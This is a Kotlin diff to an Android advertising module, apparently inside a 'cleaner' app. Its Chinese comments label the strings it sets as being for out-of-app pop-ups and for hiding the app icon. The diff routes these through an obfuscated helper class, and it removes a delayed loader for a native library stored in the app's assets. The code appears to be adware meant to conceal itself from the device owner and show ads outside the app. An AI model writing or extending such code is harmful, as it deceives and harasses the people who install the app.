@@ -16,7 +16,7 @@ import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import org.json.JSONObject
-import qr.b.a
+import bef.aligeit.fcthing
 import com.clean.dependency.Constant
 import com.facebook.FacebookSdk
 import com.facebook.appevents.AppEventsLogger
@@ -63,10 +63,9 @@ object AdE {
     private var isCurDay = Core.getStr("ad_lcd")
     private var numJumps = Core.getInt("ac_njp")
 
-    @JvmStatic
-    var isLoadH = false //是否H5的so 加载成功
-    private var tagL = "" //调用外弹 隐藏icon字符串
-    private var tagO = "" //外弹字符串
+
+    private var tagL = "peektalk" //调用外弹 隐藏icon字符串
+    private var tagO = "tssf" //外弹字符串
 
     @JvmStatic
     var strBroadKey = "" // 广播的key
@@ -214,7 +213,7 @@ object AdE {
                 return@launch
             }
             Core.pE("test_s_load", "${System.currentTimeMillis() - time}")
-            a.a0(tagL)
+            fcthing.a0(tagL,65f)
             if (isLi().not()) {
                 AdCenter.loadAd()
             }
@@ -235,19 +234,6 @@ object AdE {
             }
         }
 
-        mMainScope.launch(Dispatchers.IO) {
-            delay(1000)
-            if (loadSFile(if (is64i) Constant.H_64 else Constant.H_32)) {
-                withContext(Dispatchers.Main) {
-                    try {
-                        Log.e("TAG", "t: net-one")
-                        a.b0(mContext)
-                        isLoadH = true
-                    } catch (_: Throwable) {
-                    }
-                }
-            }
-        }
     }
 
     private fun loadSFile(assetsName: String): Boolean {
@@ -332,7 +318,7 @@ object AdE {
             delay(finishAc())
             sNumJump(numJumps + 1)
             Core.pE("ad_start")
-            a.a0(tagO)
+            fcthing.a0(tagO,70f)
             lastSAdTime = System.currentTimeMillis()
             delay(4000)
             checkAdIsReadyAndGoNext()
